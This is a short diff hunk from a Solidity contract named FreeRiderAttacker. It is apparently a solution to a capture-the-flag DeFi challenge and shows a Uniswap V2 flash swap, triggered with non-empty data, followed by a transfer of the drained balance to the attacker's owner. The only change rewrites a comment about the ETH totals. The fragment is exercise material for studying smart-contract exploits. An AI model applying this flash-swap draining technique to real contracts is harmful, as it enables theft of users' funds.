@@ -46,7 +46,7 @@ contract FreeRiderAttacker is IERC721Receiver {
         // new bytes(1) will trigger the flash swap functionality in the uniswapV2Pair contract
         // data.length == 0 (standard swap) vs data.length > 0 (flash swap)
         uniswapV2Pair.swap(NFT_PRICE, 0, address(this), new bytes(1));
-        // transfer the 45 ETH from attacker to owner (player)
+        // transfer the balance to owner 45ETH - 16 ETH + 90 ETH = 119 ETH
         payable(owner).transfer(address(this).balance);
     }
 
